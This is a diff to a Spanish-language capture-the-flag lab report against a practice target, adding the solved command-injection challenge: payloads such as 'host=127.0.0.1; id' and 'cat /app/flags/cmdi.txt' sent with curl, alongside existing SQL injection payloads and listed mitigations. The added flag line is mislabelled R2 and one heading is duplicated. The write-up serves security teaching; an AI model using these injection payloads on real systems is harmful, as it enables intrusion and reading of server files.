@@ -21,17 +21,18 @@ Estado obtenido mediante `./ctf status 07`:
 ```text
 R1 ✓ SQLi - bypass de autenticacion
 R2 ✓ SQLi - extraccion de datos con UNION
-R3 Pendiente
+R3 ✓ Inyeccion de comandos (RCE)
 R4 Pendiente
 R5 Pendiente
 
-Progreso: 2/5 (40%)
+Progreso: 3/5 (60%)
 ```
 
 Flags verificadas:
 
 - R1: `FLAG{sqli_auth_bypass}`
 - R2: `FLAG{sqli_union_dump}`
+- R2: `FLAG{command_injection_rce}`
 
 ## 2. Tabla de explotación
 
@@ -39,7 +40,7 @@ Flags verificadas:
 |---|---|---|---|---|
 | SQLi auth (R1) | `user=admin' --` y contraseña arbitraria. | La comilla cierra el valor del usuario y `--` comenta el resto de la consulta SQL. | Acceso al panel de administración sin conocer la contraseña. | Consultas parametrizadas y almacenamiento seguro de contraseñas mediante hashes. |
 | SQLi UNION (R2) | `%' UNION SELECT clave,valor FROM secrets-- ` | Se combina la consulta original con `SELECT clave,valor FROM secrets`. | Extracción de información confidencial de la base de datos. | Consultas parametrizadas, validación de entradas y principio de mínimo privilegio. |
-| Command injection (R3) | Pendiente. | Pendiente. | Pendiente. | Pendiente. |
+| Command injection (R3) | `host=127.0.0.1; id` y `host=127.0.0.1; cat /app/flags/cmdi.txt` | El servidor ejecutó `ping -c1 127.0.0.1; id` y luego `cat /app/flags/cmdi.txt`. | Ejecución remota de comandos con privilegios de root y lectura de archivos del servidor. | Evitar construir comandos mediante concatenación de entradas. Utilizar APIs seguras, listas permitidas de valores y ejecutar el servicio con privilegios mínimos. |
 | Path traversal (R4) | Pendiente. | Pendiente. | Pendiente. | Pendiente. |
 | IDOR (R5) | Pendiente. | Pendiente. | Pendiente. | Pendiente. |
 
@@ -73,7 +74,13 @@ Esto permitió obtener información de la tabla `secrets`.
 
 **P3 — ¿Qué sigue después del RCE?**
 
-Pendiente.
+**P3 — ¿Qué sigue después del RCE?**
+
+Después de conseguir ejecución remota de comandos, un atacante podría intentar
+mantener persistencia en el sistema, obtener mayores privilegios, acceder a
+otros recursos internos, extraer información confidencial o comprometer otros
+servicios. En este laboratorio comprobamos que el proceso se ejecutaba como
+root, lo que aumenta considerablemente el impacto de la vulnerabilidad.
 
 **P4 — ¿Por qué parametrizar evita la SQLi?**
 
@@ -103,3 +110,18 @@ curl -iG "http://phantomcorp/buscar" \
 ```
 
 Resultado: extracción de `FLAG{sqli_union_dump}` desde la tabla `secrets`.
+
+**R3 — Command Injection:**
+
+```bash
+curl -iG "http://phantomcorp/herramientas/ping" \
+  --data-urlencode "host=127.0.0.1; id"
+
+curl -iG "http://phantomcorp/herramientas/ping" \
+  --data-urlencode "host=127.0.0.1; ls -la /app/flags"
+
+curl -iG "http://phantomcorp/herramientas/ping" \
+  --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"
+```
+
+Resultado: ejecución de comandos como root y obtención de `FLAG{command_injection_rce}`.
